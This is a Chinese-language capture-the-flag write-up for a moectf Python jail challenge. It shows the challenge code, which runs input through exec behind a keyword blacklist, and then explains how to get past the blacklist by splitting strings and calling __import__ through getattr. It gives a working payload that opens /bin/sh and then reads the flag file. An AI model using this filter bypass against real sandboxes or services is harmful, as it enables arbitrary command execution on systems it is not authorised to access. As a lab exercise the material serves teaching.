# ez_ban_ja1l - WriteUp
> 本题知识点：  
> - 特殊的内置全局变量`__builtins__`  
> - 特殊的内置函数 `getattr` 的使用  
> - 使用`__import__`函数替代`import`
> - 通过拆分字符串来避免黑名单  
  
## 源码 - chall.py  
```python
def chall():
    blacklist = ['os','exec','eval','import','system']
    code = input('Give me your code: ')
    for b in blacklist:
        if b in code:
            print(f'Blacklist word: {b}')
            return
    exec(code)

if __name__ == '__main__':
    chall()
```

## 分析  
通过阅读代码易知，程序通过简单的字符串黑名单匹配来禁止`os` `exec` `eval` `import` `system`指令  
通过字符串拆分的方式就可以绕过，如将`import`拆成`imp`+`ort`  
但是这种方式**只能用于字符串**，那应该怎样 import 呢？  
内置函数`getattr`可以做到这一点  
[**getattr**食用说明](https://www.runoob.com/python/python-func-getattr.html)  
因此，我们只要调用`__builtins__`中的`__import__`即可  

## 构造Payload  
```python
getattr(getattr(__builtins__, '__impor' + 't__')('o' + 's'), 'syst' + 'em')('/bin/sh')
```
输入Payload后我们就来到了终端，接着用简单的 `find / -name flag`即可找到位于`/tmp/flag`的flag文件，使用`cat`指令即可获取flag  
> 注：如果你使用`env`来获取环境变量，会得到假的flag，格式与moectf不一致  

```bash
cat /tmp/flag
moectf{636cdea4-7f57-e38c-7317-9ae07b73e1dc}
```
